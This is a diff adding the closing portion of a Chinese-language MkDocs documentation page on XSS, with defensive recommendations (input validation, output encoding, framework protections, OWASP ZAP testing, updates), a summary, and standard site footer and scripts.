+<li><strong>永不信任用户输入</strong>：对所有用户输入进行验证和清理</li>
+<li><strong>输出编码</strong>：在显示用户数据前进行适当的编码</li>
+<li><strong>使用现代框架</strong>：现代Web框架（如React、Angular、Vue）内置了XSS防护机制</li>
+<li><strong>定期进行安全测试</strong>：使用工具如OWASP ZAP进行XSS测试</li>
+<li><strong>保持软件更新</strong>：及时更新Web服务器、框架和库</li>
+</ol>
+<h2 id="_2">总结<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>XSS是一种常见但严重的Web安全漏洞，通过采用适当的防御措施，如输入验证、输出编码、内容安全策略等，可以有效地减少XSS攻击的风险。在开发过程中，遵循安全编码规范，定期进行安全测试是确保应用程序安全的关键。</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.sections", "toc.integrate", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.13a4f30d.min.js"></script>
+      
+    
+  </body>
+</html>
